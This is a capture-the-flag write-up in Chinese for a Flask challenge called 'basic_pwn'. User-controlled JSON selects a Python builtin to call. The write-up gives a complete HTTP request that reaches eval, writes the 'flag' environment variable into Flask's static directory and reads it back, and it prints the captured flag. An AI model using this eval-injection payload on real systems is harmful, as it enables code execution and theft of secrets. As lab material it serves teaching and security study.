# basic_pwn

## 题目简述

题目是一个 Flask 应用。`GET /` 返回源码，`POST /pwn` 接收 JSON 字段 `name`，把它扩展到一个模拟栈中，再弹出最后两个元素作为函数名和参数，从 Python 内置函数表中调用。容器把 flag 放在环境变量 `flag` 中。

虽然题名包含 `pwn`，决定性漏洞位于 HTTP 接口的输入处理和 Python 动态调用，因此按实际主障碍归入 Web。

## 解题过程

关键逻辑如下：

```python
functions = globals()['__builtins__'].__dict__

stack = []
stack.append('print')
name = request.get_json().get("name")
stack.extend(name)
args = stack.pop()
func = stack.pop()
functions[func](args)
```

若提交数组 `['eval', '<表达式>']`，扩展后的栈为：

```text
['print', 'eval', '<表达式>']
```

两次 `pop()` 后，服务端实际执行 `eval('<表达式>')`。接口固定返回 `Success`，不会把表达式结果带入 HTTP 响应，所以要让表达式产生可读取的副作用。

Flask 默认注册 `/static/<path>` 路由。可以在单个 `eval` 表达式中创建 `static` 目录，再把环境变量写入其中：

```http
POST /pwn HTTP/1.1
Host: TARGET
Content-Type: application/json

{
  "name": [
    "eval",
    "(__import__('os').makedirs('static',exist_ok=True),open('static/flag','w').write(__import__('os').environ['flag']))"
  ]
}
```

请求成功后读取：

```http
GET /static/flag HTTP/1.1
Host: TARGET
```

得到：

```text
0xGame{Pwn_Is_Intersting!}
```

这种方法不依赖反弹 Shell、临时公网 IP或容器中额外安装的命令，复现更稳定。

## 方法总结

问题的根源不是 `eval` 单独出现，而是用户能控制从 `__builtins__.__dict__` 取出的函数名和参数。利用链为“JSON 数组控制栈尾 → 选择 `eval` → 执行 Python 表达式 → 将环境变量写入 Flask 静态目录”。遇到无回显 RCE 时，优先寻找应用自身可读取的文件路径，通常比外带连接更可靠。
